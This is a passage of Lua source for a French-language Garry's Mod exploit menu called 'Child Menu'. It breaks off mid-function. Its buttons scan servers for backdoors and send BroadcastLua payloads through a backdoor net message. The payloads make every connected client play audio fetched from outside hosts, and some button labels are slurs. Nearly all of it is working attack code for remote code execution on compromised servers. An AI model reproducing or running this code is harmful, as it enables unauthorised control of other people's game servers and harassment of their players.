chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Scan backdoor en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 100 )
		Macro:SetParent(Serveur)
        Macro:SetText( "Scan backdoor toutes les 10s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 10 secondes en cours..." )
	timer.Create( "bdcheck10s", 10, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 130 )
		Macro:SetParent(Serveur)
        Macro:SetText( "Scan backdoor toutes les 30s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 30 secondes en cours..." )
	timer.Create( "bdcheck30s", 30, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

--DANS LE TARGETS
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
		Macro:SetParent(Targets)
        Macro:SetText( "Scan backdoor" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Scan backdoor en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 100 )
		Macro:SetParent(Targets)
        Macro:SetText( "Scan backdoor toutes les 10s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 10 secondes en cours..." )
	timer.Create( "bdcheck10s", 10, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 130 )
		Macro:SetParent(Targets)
        Macro:SetText( "Scan backdoor toutes les 30s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 30 secondes en cours..." )
	timer.Create( "bdcheck30s", 30, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

--DANS LE Misc
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Scan backdoor en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 100 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor toutes les 10s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 10 secondes en cours..." )
	timer.Create( "bdcheck10s", 10, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 130 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor toutes les 30s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 30 secondes en cours..." )
	timer.Create( "bdcheck30s", 30, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 160 )
		Macro:SetParent(Misc)
        Macro:SetText( "Menu" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Menu lancé" )
    SploitNotify("Menu lancé")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "Child_Console" ) -- What happens when you press the button
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 160 )
		Macro:SetParent(Targets)
        Macro:SetText( "Menu" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Menu lancé" )
    SploitNotify("Menu lancé")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "Child_Console" ) -- What happens when you press the button
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 160 )
		Macro:SetParent(Serveur)
        Macro:SetText( "Menu" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Menu lancé" )
    SploitNotify("Menu lancé")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "Child_Console" ) -- What happens when you press the button
end


------------------------------------------------------------------------------
----------------- SOUNDBOARD ET MUSIQUE
------------------------------------------------------------------------------

-- MUSIQUE 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 140, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Alluh" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/musique/Pomme%20de%20reinette%20et%20pomme%20d'api.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Alluh" )
    SploitNotify("Musique - Alluh ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Alluh" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/musique/Alluh.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Alluh" )
    SploitNotify("Musique - Alluh ")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Salut c'est cool" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/salutccool.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Salut c'est cool activé" )
    SploitNotify("Musique - Salut c'est cool ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Targets)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Tenir ta main" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Childchristofficiel.fr/gmod/upload/Gr%C3%A9goire.mp3\", \"mono\", function()end )]])")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Tenir ta main activé" )
    SploitNotify("Musique - Tenir ta main ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Wesh Alors [JUL]" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end

Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Childchristofficiel.fr/gmod/upload/wesh.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Wesh Alors [JUL] activé" )
    SploitNotify("Musique - Jul WESH ALORS ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - MondotekAlive" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/musique/lilpump.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - MondotekAlive activé" )
    SploitNotify("Musique - MondotekAlive ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Un éléphant " )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Childchristofficiel.fr/gmod/upload/Un%20%C3%A9l%C3%A9phant%20qui%20se%20balan%C3%A7ait.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Un éléphant qui se balancait activé !" )
    SploitNotify("Musique - Un éléphant qui se balancait ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Chuis bo" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/chuis%20bo.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Chuis bo" )
    SploitNotify("Musique - Chuis bo ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Pouet pouet" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/R%C3%A9mi%20-%20La%20Totomobile%20-%20clip%20officiel.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Pouet Pouet" )
    SploitNotify("Musique - Pouet pouet ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Pirouette" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/Pirouette,%20cacahu%C3%A8te%20-%20Il%20%C3%A9tait%20un%20petit%20homme.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Pirouette" )
    SploitNotify("Musique - Pirouette ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Pomme api" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/Pomme%20de%20reinette%20et%20pomme%20d'api.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Pomme api" )
    SploitNotify("Musique - Pomme api ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Gipsy" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/L'araign%C3%A9e%20Gipsy.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Musique - Gipsy" )
    SploitNotify("Musique - Gipsy ")
    surface.PlaySound("buttons/blip1.wav") 
end
----SOUNDBOARD


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 140, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - AHHHHHH" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Childchristofficiel.fr/gmod/upload/AHHHHHHHHHHHHHHHHH.wav\", \"mono\", function()end )]])") 
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Soundboard - AHHHHHH activé" )
    SploitNotify("Soundboard - AHHHHHH ")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 140, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Code avec le cul" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Childchristofficiel.fr/gmod/upload/code.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Code avec le cul activé" )
    SploitNotify("Soundboard - JE CODE AVEC LE CUL ")
    surface.PlaySound("buttons/blip1.wav") 
end

----TK78
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - WALLAH" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/tk78/Wallah.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - zehmah" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/tk78/Zehma.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - mongole" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/tk78/bruit%20de%20gogole.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - mon reup" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/tk78/mon%20rep%20se%20pose%20des%20questions.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - musique 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
